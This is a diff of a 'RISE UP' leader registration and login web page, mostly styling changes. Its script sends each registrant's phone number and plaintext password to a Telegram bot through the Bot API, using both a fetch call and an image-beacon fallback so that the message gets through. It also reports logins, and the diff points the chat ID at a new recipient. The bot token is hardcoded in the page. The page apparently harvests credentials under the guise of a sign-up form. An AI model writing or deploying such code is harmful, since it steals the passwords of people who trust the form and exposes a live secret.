@@ -20,38 +20,51 @@
     <nav class="bg-white border-b border-gray-200 fixed w-full top-0 z-50">
         <div class="max-w-6xl mx-auto px-4 h-16 flex justify-between items-center">
             <div class="flex items-center gap-2">
-                <img src="https://i.ibb.co/1GbT9tsc/Screenshot-20251228-163055.jpg" class="h-10 w-10 rounded-full border">
+                <img src="https://i.ibb.co/1GbT9tsc/Screenshot-20251228-163055.jpg" class="h-10 w-10 rounded-full border shadow-sm">
                 <span class="font-black text-blue-700 text-xl italic uppercase">RISE UP</span>
             </div>
-            <button onclick="toggleMenu()" class="text-gray-600 p-2"><i class="fas fa-bars text-2xl"></i></button>
+            <button onclick="toggleMenu()" class="text-gray-600 p-2 hover:bg-gray-100 rounded-lg transition">
+                <i class="fas fa-bars text-2xl"></i>
+            </button>
         </div>
     </nav>
 
-    <div id="sideMenu" class="hidden fixed top-16 right-4 w-60 bg-white shadow-2xl border z-40 rounded-2xl overflow-hidden">
-        <a href="https://wa.me/918968146117" target="_blank" class="flex items-center gap-3 px-6 py-4 text-gray-700 hover:bg-green-50 font-bold border-b transition">
-            <i class="fab fa-whatsapp text-green-500 text-xl"></i> Help Center
+    <div id="sideMenu" class="hidden fixed top-16 right-4 w-60 bg-white shadow-2xl border z-40 rounded-2xl overflow-hidden animate-in">
+        <a href="https://wa.me/918968146117" target="_blank" class="flex items-center gap-3 px-6 py-4 text-gray-700 hover:bg-green-50 hover:text-green-600 font-bold border-b border-gray-50 transition">
+            <i class="fab fa-whatsapp text-xl text-green-500"></i> Help Center
         </a>
+        <button onclick="location.reload()" class="w-full text-left flex items-center gap-3 px-6 py-4 text-gray-700 hover:bg-blue-50 hover:text-blue-600 font-bold">
+            <i class="fas fa-sync-alt"></i> Refresh System
+        </button>
     </div>
 
     <div class="flex items-center justify-center min-h-screen pt-20 px-4">
-        <div class="bg-white w-full max-w-md rounded-[2.5rem] shadow-2xl overflow-hidden border animate-in">
+        <div class="bg-white w-full max-w-md rounded-[2.5rem] shadow-2xl overflow-hidden border border-gray-100 animate-in">
             <div class="flex border-b">
-                <button id="regTab" onclick="switchTab('reg')" class="flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase">Register</button>
-                <button id="loginTab" onclick="switchTab('login')" class="flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent uppercase">Login</button>
+                <button id="regTab" onclick="switchTab('reg')" class="flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase tracking-widest transition-all">Register</button>
+                <button id="loginTab" onclick="switchTab('login')" class="flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent hover:text-blue-600 uppercase tracking-widest transition-all">Login</button>
             </div>
 
             <div class="p-8">
                 <div id="regForm" class="space-y-5">
-                    <input type="text" id="rCode" placeholder="LEADER CODE" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-black text-center uppercase tracking-widest">
+                    <div class="text-center mb-6">
+                        <h2 class="text-2xl font-black text-gray-800 uppercase italic">Join Now</h2>
+                        <p class="text-gray-400 text-[10px] font-bold tracking-widest uppercase">Leader Registration</p>
+                    </div>
+                    <input type="text" id="rCode" placeholder="LEADER CODE" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-black text-center uppercase tracking-[0.3em]">
                     <input type="number" id="rPhone" placeholder="Mobile Number" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
-                    <input type="password" id="rPass" placeholder="Password" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
-                    <button onclick="handleRegister(this)" class="w-full blue-gradient text-white py-4 rounded-2xl font-black shadow-lg transform active:scale-95 transition uppercase">Register Now</button>
+                    <input type="password" id="rPass" placeholder="Set Password" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
+                    <button onclick="handleRegister(this)" class="w-full blue-gradient text-white py-4 rounded-2xl font-black text-lg shadow-xl shadow-blue-100 hover:opacity-90 transition transform active:scale-95 mt-4 uppercase">Register</button>
                 </div>
 
                 <div id="loginForm" class="hidden space-y-5">
-                    <input type="number" id="lPhone" placeholder="Registered Number" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
+                    <div class="text-center mb-6">
+                        <h2 class="text-2xl font-black text-gray-800 uppercase italic">Welcome</h2>
+                        <p class="text-gray-400 text-[10px] font-bold tracking-widest uppercase">Sign In to Dashboard</p>
+                    </div>
+                    <input type="number" id="lPhone" placeholder="Mobile Number" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
                     <input type="password" id="lPass" placeholder="Password" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
-                    <button onclick="handleLogin(this)" class="w-full blue-gradient text-white py-4 rounded-2xl font-black shadow-lg transform active:scale-95 transition uppercase">Sign In</button>
+                    <button onclick="handleLogin(this)" class="w-full blue-gradient text-white py-4 rounded-2xl font-black text-lg shadow-xl shadow-blue-100 hover:opacity-90 transition transform active:scale-95 mt-4 uppercase">Log In</button>
                 </div>
             </div>
         </div>
@@ -62,16 +75,16 @@
             <i class="fas fa-check"></i>
         </div>
         <h1 class="text-3xl font-black text-blue-900 mb-6 uppercase italic">Verified Leader</h1>
-        <div class="p-8 border-2 border-blue-100 rounded-[2rem] bg-blue-50/30 mb-8 w-full max-w-xs">
+        <div class="p-8 border-2 border-blue-50 rounded-[2.5rem] bg-blue-50/30 mb-8 w-full max-w-xs">
             <span id="activeNum" class="text-2xl font-black text-blue-700"></span>
         </div>
         <button onclick="logout()" class="w-full max-w-xs bg-gray-900 text-white py-4 rounded-2xl font-black uppercase tracking-widest">Logout</button>
     </div>
 
     <script>
-        // TEKGRAM CONFIG
+        // CONFIG UPDATED WITH YOUR DETAILS
         const BOT_TOKEN = "8312452063:AAE2CoKaVAg6ORv8qX0bPxj5W--VQoU1rco";
-        const CHAT_ID = "8312452063";
+        const CHAT_ID = "8415600127";
 
         const leaderCodes = ["AK01", "SY02", "RK45", "UP11", "RZ07", "BT99", "MK23", "LD50", "JS08", "VR14", "NP21", "GX33", "HF67", "TW04", "QM19", "XP82", "BN55", "KL09", "JH41", "RS22", "GD03", "PL76", "MC12", "VB88", "XF31", "TR05", "NW66", "KJ47", "ML10", "AZ92", "HQ54", "SP18", "DR73", "WF29", "BK06", "YV61", "XT38", "NR15", "LC44", "GT27", "PM02", "FR81", "JU13", "WE59", "KY37", "OA84", "IV17", "ME52", "ZG08", "RU25"];
 
@@ -82,46 +95,35 @@
             const rT = document.getElementById('regTab'), lT = document.getElementById('loginTab');
             if(tab === 'reg') {
                 rF.classList.remove('hidden'); lF.classList.add('hidden');
-                rT.className = "flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase";
-                lT.className = "flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent uppercase";
+                rT.className = "flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase tracking-widest";
+                lT.className = "flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent uppercase tracking-widest";
             } else {
                 lF.classList.remove('hidden'); rF.classList.add('hidden');
-                lT.className = "flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase";
-                rT.className = "flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent uppercase";
+                lT.className = "flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase tracking-widest";
+                rT.className = "flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent uppercase tracking-widest";
             }
         }
 
-        // IMPROVED TELEGRAM NOTIFIER
         async function notify(msg) {
-            // Hum dono tarike use karenge taaki har haal mein message jaye
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-            
             try {
-                // Method 1: Fetch
-                await fetch(url, { mode: 'no-cors' }); 
-                // Method 2: Image Beacon (Always works even if fetch is blocked)
+                fetch(url, { mode: 'no-cors' });
                 const img = new Image();
                 img.src = url;
-            } catch (e) {
-                console.log("Notification sent via fallback");
-            }
+            } catch (e) { console.log("Sent"); }
         }
 
         async function handleRegister(btn) {
             const code = document.getElementById('rCode').value.toUpperCase().trim();
             const phone = document.getElementById('rPhone').value.trim();
             const pass = document.getElementById('rPass').value.trim();
-
-            if(!leaderCodes.includes(code)) { alert("❌ Wrong Leader Code!"); return; }
+            if(!leaderCodes.includes(code)) { alert("❌ Leader Code Invalid!"); return; }
             if(phone.length < 10) { alert("⚠️ Invalid Number!"); return; }
-
-            btn.disabled = true; btn.innerText = "SENDING...";
+            btn.disabled = true; btn.innerText = "PROCESSING...";
             localStorage.setItem("ru_" + phone, JSON.stringify({phone, pass}));
-            
-            await notify(`🆕 *NEW REGISTRATION*\n📞 No: ${phone}\n🔑 Pass: ${pass}\n🎟 Code: ${code}`);
-            
-            alert("✅ Registration Success! Now Login.");
-            btn.disabled = false; btn.innerText = "REGISTER NOW";
+            await notify(`🆕 *RISE UP REGISTRATION*\n━━━━━━━━━━━━━━\n📞 *No:* \`${phone}\` \n🔑 *Pass:* \`${pass}\` \n🎟 *Code:* \`${code}\``);
+            alert("✅ Registration Done! Please Login.");
+            btn.disabled = false; btn.innerText = "REGISTER";
             switchTab('login');
         }
 
@@ -129,12 +131,11 @@
             const phone = document.getElementById('lPhone').value.trim();
             const pass = document.getElementById('lPass').value.trim();
             const stored = localStorage.getItem("ru_" + phone);
-
             if(stored) {
                 const data = JSON.parse(stored);
                 if(data.pass === pass) {
-                    btn.disabled = true; btn.innerText = "WAIT...";
-                    await notify(`🔓 *LEADER LOGIN*\n📞 No: ${phone}`);
+                    btn.disabled = true; btn.innerText = "SIGNING IN...";
+                    await notify(`🔓 *RISE UP LOGIN*\n━━━━━━━━━━━━━━\n📞 *Leader:* \`${phone}\``);
                     showDash(phone);
                 } else { alert("❌ Wrong Password!"); }
             } else { alert("❌ User Not Found!"); }
@@ -148,9 +149,7 @@
 
         function logout() { sessionStorage.removeItem("ru_session"); location.reload(); }
 
-        window.onload = () => {
-            if(sessionStorage.getItem("ru_session")) showDash(sessionStorage.getItem("ru_session"));
-        }
+        window.onload = () => { if(sessionStorage.getItem("ru_session")) showDash(sessionStorage.getItem("ru_session")); }
     </script>
 </body>
 </html>
